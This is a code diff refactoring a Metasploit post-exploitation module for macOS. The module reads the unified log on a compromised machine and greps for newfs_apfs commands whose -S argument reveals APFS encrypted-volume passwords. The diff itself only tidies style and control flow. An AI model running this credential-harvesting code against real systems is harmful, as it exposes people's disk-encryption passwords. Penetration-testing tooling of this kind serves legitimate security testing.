@@ -29,7 +29,12 @@ class MetasploitModule < Msf::Post
           'cbrnrd'          # Metasploit module
         ],
         'SessionTypes' => [ 'shell', 'meterpreter' ],
-        'DisclosureDate' => '2018-03-21'
+        'DisclosureDate' => '2018-03-21',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
       )
     )
     register_options([
@@ -47,25 +52,28 @@ class MetasploitModule < Msf::Post
 
   def run
     if check == Exploit::CheckCode::Safe
-      print_error 'This version of OSX is not vulnerable'
+      print_error('This version of OSX is not vulnerable')
       return
     end
+
     cmd = "log show --info --predicate 'eventMessage contains \"newfs_\"'"
     cmd << " | grep #{datastore['MOUNT_PATH']}" unless datastore['MOUNT_PATH'].empty?
-    vprint_status "Running \"#{cmd}\" on target..."
+    vprint_status("Running \"#{cmd}\" on target...")
     results = cmd_exec(cmd)
-    vprint_status "Target results:\n#{results}"
+    vprint_status("Target results:\n#{results}")
+
     if results.empty?
       print_error 'Got no response from target. Stopping...'
-    else
-      successful_lines = 0
-      results.lines.each do |l|
-        next unless l =~ /newfs_apfs(.*)-S(.*)$/
-
-        print_good "APFS command found: #{::Regexp.last_match(0)}"
-        successful_lines += 1
-      end
-      print_error 'No password(s) found for any volumes. Exiting...' if successful_lines.zero?
+      return
     end
+
+    successful_lines = 0
+    results.lines.each do |l|
+      next unless l =~ /newfs_apfs(.*)-S(.*)$/
+
+      print_good "APFS command found: #{::Regexp.last_match(0)}"
+      successful_lines += 1
+    end
+    print_error 'No password(s) found for any volumes. Exiting...' if successful_lines.zero?
   end
 end
